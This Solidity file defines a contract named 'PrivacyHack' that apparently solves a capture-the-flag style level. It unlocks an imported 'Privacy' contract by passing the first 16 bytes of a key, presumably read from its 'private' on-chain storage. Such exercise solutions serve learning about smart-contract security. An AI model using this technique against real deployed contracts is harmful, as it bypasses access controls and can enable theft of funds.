// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import '../privacy/Privacy.sol';

contract PrivacyHack {
  
  function attack(address instance, bytes32 _key) public {

    Privacy privacy = Privacy(instance);
    privacy.unlock(bytes16(_key));
  }
}